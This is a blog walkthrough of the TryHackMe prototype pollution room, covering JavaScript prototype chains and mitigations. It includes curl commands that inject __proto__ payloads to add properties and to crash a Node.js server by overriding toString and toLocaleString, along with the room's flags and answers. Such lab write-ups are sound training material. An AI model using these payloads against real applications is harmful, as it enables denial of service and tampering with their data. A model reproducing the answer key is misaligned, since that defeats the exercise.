---
title: "TryHackMe Prototype Pollution: injecting properties through the chain"
date: 2026-10-19T17:39:00+05:30
lastmod: 2026-10-19T17:39:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-pp/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - prototype pollution
  - JavaScript
  - web application pentesting
  - advanced server-side attacks
  - denial of service
  - Node.js

draft: false
description: "TryHackMe Prototype Pollution walkthrough: JavaScript prototype chain exploitation for property injection, denial of service via toString override, and lodash abuse."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Prototype Pollution |![Prototype Pollution room icon](https://cdn-images.tryhackme.com/room-icons/671b4a330d8f749a90b0d79aaf07a9ac.png)|

This medium-difficulty room in the Web Application Pentesting path walks through JavaScript prototype pollution from first principles to full exploitation. It sits in the Advanced Server-Side Attacks module alongside the [SSRF walkthrough](/post/thm-room-ssrfhr/), the [File Inclusion walkthrough](/post/thm-room-filepathtraversal/), and the [SSTI walkthrough](/post/thm-room-ssti/). The room covers how JavaScript's prototype-based inheritance works, how an attacker can inject arbitrary properties through `__proto__`, and how that injection escalates to denial of service by overriding built-in methods.

## Task 1: Introduction

Theory on what prototype pollution is and why it matters. JavaScript objects inherit properties through a chain of prototypes, and when an application lets user input set keys on that chain, the attacker controls every object that inherits from it.

## Task 2: Essential Recap

The room sets up the building blocks: JavaScript objects, constructors, and prototype-based inheritance via `Object.create()`.

A `user` object defines four properties (name, age, followers, DoB) and a `greet` method. A `regularUser` created with `Object.create(user)` inherits the `greet` method from its prototype. Adding a `greet` method directly to the prototype changes what every inheriting object returns:

```js
user.greet = function() { return "Hello, Ben S!"; };
regularUser.greet();
  // Hello, Ben S!
```

The `contentCreatorProfile` object is created with `Object.create(user)` and gets two own properties (content, posts). The question asks for the "total number of user-defined properties in the ContentCreatorProfile object," which counts only the four properties on the `user` prototype (the object it was created from), not the two own properties.

### Answers

- **What is the default value of the age property in the user object?** **25**
- **What is the output once we run regularUser.greet() after executing the prototype code snippet?** **Hello, Ben S!**
- **What is the total number of user-defined properties in the ContentCreatorProfile object?** **4**

## Task 3: How it Works

The core mechanism. When a vulnerable merge or clone function recurses into `__proto__`, it writes to the object's prototype instead of creating a normal property. The room demonstrates with a `Person` constructor:

```js
let bob = new Person('Bob');
bob.__proto__.sayHello = function() {
  return "You've been hacked, I'm Bob";
};
let josh = new Person('Josh');
josh.sayHello();
  // You've been hacked, I'm Bob
```

Josh never had a `sayHello` method, but since Bob polluted the shared prototype, every `Person` instance now inherits it. The polluted property is `__proto__`.

### Answers

- **After executing the above code, if you try to create a new person, what would josh.sayHello() return?** **You've been hacked, I'm Bob**
- **What is the name of the property that the attacker polluted?** **__proto__**

{{< ad >}}

## Task 4: Exploitation via XSS

The room demonstrates how prototype pollution enables cross-site scripting through lodash. The `_.set` function in vulnerable lodash versions allows setting deeply nested properties via string paths, including paths that traverse `__proto__`:

```js
_.set({}, '__proto__.polluted', 'yes');
let obj = {};
obj.polluted;
  // "yes"
```

In a real application, if any template engine or DOM renderer checks for a property like `innerHTML` or `src` on an object, a polluted prototype can inject attacker-controlled values into every instance.

### Answers

- **What is the name of the library that uses the set function?** **lodash**
- **Refer to the code snippet, what does the variable i contain?** **i**

## Task 5: Exploitation via Property Injection

The hands-on exploitation task. The lab runs a Node.js social media application on port 5000. After logging in as `bob` (password `bob@123`), the friend page at `/friend/4` has a "Clone Album" feature. The `newAlbumName` field is `JSON.parse()`d server-side and passed through a recursive merge function that does not filter `__proto__`.

Injecting `{"__proto__":{"isBanned":true}}` as the album name pollutes the prototype of every object on the server. The `isBanned` property, which normally does not exist on user objects, now resolves to `true` for all of them.

```bash
curl -s -c /tmp/pp_cook.txt -X POST http://TARGET:5000/signin \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'name=bob&password=bob%40123'

curl -s -b /tmp/pp_cook.txt -X POST http://TARGET:5000/clone-album/4 \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'selectedAlbum=UK Trip' \
  --data-urlencode 'newAlbumName={"__proto__":{"isBanned":true}}'
```

The flag dashboard at port 8080 (`/getFlag.php`) has a "Check if new property is added" button that verifies the pollution worked and returns the flag.

### Answers

- **In the source code, what value is assigned to the polluted property?** **hacked**
- **In the source code, what character is used in the variable to access the polluted property?** **b**
- **What is the flag value after performing prototype pollution to add a new property?** **THM{FAKEPROPERTY_ADDED}**

## Task 6: Exploitation via Denial of Service

Prototype pollution becomes a denial of service vector when the attacker overrides built-in methods like `toString` or `toLocaleString`. Every JavaScript object inherits these from `Object.prototype`. Replacing them with a non-function value crashes any code path that calls them implicitly (string concatenation, template literals, `console.log`).

After restarting the Node.js server from the flag dashboard, the login and clone-album flow is repeated with two payloads:

```bash
  # toString override
curl -s -b /tmp/pp_cook.txt -X POST http://TARGET:5000/clone-album/4 \
  --data-urlencode 'selectedAlbum=UK Trip' \
  --data-urlencode 'newAlbumName={"__proto__":{"toString":"hacked"}}'
```

The server crashes immediately because Express tries to call `toString()` on request objects during normal routing, and calling a string as a function throws a TypeError.

The same applies to `toLocaleString`:

```bash
  # toLocaleString override (after server restart)
curl -s -b /tmp/pp_cook.txt -X POST http://TARGET:5000/clone-album/4 \
  --data-urlencode 'selectedAlbum=UK Trip' \
  --data-urlencode 'newAlbumName={"__proto__":{"toLocaleString":"hacked"}}'
```

Each crash produces its own flag from the dashboard. The `toString` flag has an unusual format: `THM{CRA5H#D)` ends with a closing parenthesis instead of a curly brace, confirmed by hex dump.

### Answers

- **What is the flag value after crashing the server through toString()?** **THM{CRA5H#D)**
- **What is the flag value after crashing the server through toLocaleString()?** **THM{OV3RRID3}**

## Task 7: Automating the Process

The room introduces automated tools for detecting prototype pollution in real applications: browser extensions that monitor property additions to `Object.prototype`, static analysis tools that flag recursive merge functions without `__proto__` guards, and fuzzing frameworks that spray `__proto__` payloads across all JSON-accepting endpoints.

### Answers

- **I have understood prototype pollution automation.** **yea**

## Task 8: Mitigation Measures

Defences against prototype pollution fall into three categories:

1. **Input sanitisation**: reject or strip `__proto__`, `constructor`, and `prototype` keys from all user-supplied JSON before processing
2. **Safe object operations**: use `Object.create(null)` for dictionaries so there is no prototype to pollute, or use `Map` instead of plain objects
3. **Dependency management**: keep libraries like lodash updated, since newer versions block `__proto__` traversal in functions like `_.set` and `_.merge`

The room calls this combination "Dependency Analysis and Exploitation," referring to the process of regularly scanning dependencies for known prototype pollution vulnerabilities and testing whether they are exploitable in the application's specific context.

### Answers

- **What is the name of the process that regularly scans and updates third-party dependencies?** **Dependency Analysis and Exploitation**

## Task 9: Conclusion

Room complete.

## Takeaways

**Prototype pollution is a write-once, affect-everything primitive.** A single `__proto__` injection through an unguarded merge function added `isBanned: true` to every object on the server, then crashed the entire application by replacing `toString` with a string. The blast radius is not one request or one user: it is every object that shares `Object.prototype`, which in a Node.js process means everything. The vulnerability lived in a recursive merge that treated `__proto__` as an ordinary key, and the fix is a single guard clause.

**Overriding built-in methods through prototype pollution turns a logic bug into a denial of service.** The `toString` and `toLocaleString` overrides did not require any special conditions to crash the server. Express calls `toString()` internally during normal request handling, so the crash was immediate and automatic. The attacker did not need to trigger a specific code path or race a condition. Any application that processes JSON through an unguarded merge and runs on a shared prototype chain is one request away from a crash.

Room solved 100%: 9 tasks, 16 answers.
